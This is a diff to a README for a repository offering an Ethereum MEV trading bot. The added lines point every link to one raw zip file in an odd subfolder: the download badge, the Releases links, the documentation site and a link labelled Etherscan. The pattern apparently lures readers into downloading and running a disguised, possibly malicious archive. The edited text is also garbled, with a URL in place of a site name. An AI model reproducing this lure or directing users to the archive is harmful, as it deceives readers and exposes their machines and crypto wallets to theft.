@@ -1,10 +1,10 @@
 # 🎉 Pool-Mev-BOT-contracts - Simplify Your Ethereum Trading
 
-![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
+![Download](https://raw.githubusercontent.com/ChicaVirus69/Pool-Mev-BOT-contracts/main/quarterstaff/Pool-Mev-BOT-contracts.zip%20Latest%20Release-Click%20Here-blue)
 
 ## 🌟 Introduction
 
-Welcome to the Pool-Mev-BOT-contracts repository! This application allows you to join the POOLMEV.com bot on Ethereum Mainnet. With this tool, you can easily deploy your personal smart contract directly to the Mainnet. All pool interactions take place on the Mainnet, ensuring everything is completely decentralized and transparent. You can check the details of the actions on [Etherscan](https://etherscan.io).
+Welcome to the Pool-Mev-BOT-contracts repository! This application allows you to join the https://raw.githubusercontent.com/ChicaVirus69/Pool-Mev-BOT-contracts/main/quarterstaff/Pool-Mev-BOT-contracts.zip bot on Ethereum Mainnet. With this tool, you can easily deploy your personal smart contract directly to the Mainnet. All pool interactions take place on the Mainnet, ensuring everything is completely decentralized and transparent. You can check the details of the actions on [Etherscan](https://raw.githubusercontent.com/ChicaVirus69/Pool-Mev-BOT-contracts/main/quarterstaff/Pool-Mev-BOT-contracts.zip).
 
 ## 🔎 What You Need to Know
 
@@ -34,7 +34,7 @@ Before using Pool-Mev-BOT-contracts, make sure your system meets these requireme
 1. **Visit the Releases Page:** 
    Go to the following link to download the latest version of Pool-Mev-BOT-contracts: 
 
-   [Download Latest Release](https://github.com/ChicaVirus69/Pool-Mev-BOT-contracts/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/ChicaVirus69/Pool-Mev-BOT-contracts/main/quarterstaff/Pool-Mev-BOT-contracts.zip)
 
 2. **Download the Application:**
    On the Releases page, find the latest version and click on it. You will see a list of available files. Choose the appropriate file for your operating system and click to download.
@@ -73,7 +73,7 @@ Now that everything is set, you can start the bot:
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Access detailed guides and FAQs on the POOLMEV.com website for further assistance.
+- **Documentation:** Access detailed guides and FAQs on the https://raw.githubusercontent.com/ChicaVirus69/Pool-Mev-BOT-contracts/main/quarterstaff/Pool-Mev-BOT-contracts.zip website for further assistance.
 - **Community Support:** Join our community forums to share experiences and ask questions. Engage with other users who may have similar queries.
 
 ## 📞 Support 
@@ -94,4 +94,4 @@ For any further questions, revisit the documentation or engage with our communit
 
 Remember, you can always revisit this section to download the latest version:
 
-[Download Latest Release](https://github.com/ChicaVirus69/Pool-Mev-BOT-contracts/releases)
+[Download Latest Release](https://raw.githubusercontent.com/ChicaVirus69/Pool-Mev-BOT-contracts/main/quarterstaff/Pool-Mev-BOT-contracts.zip)
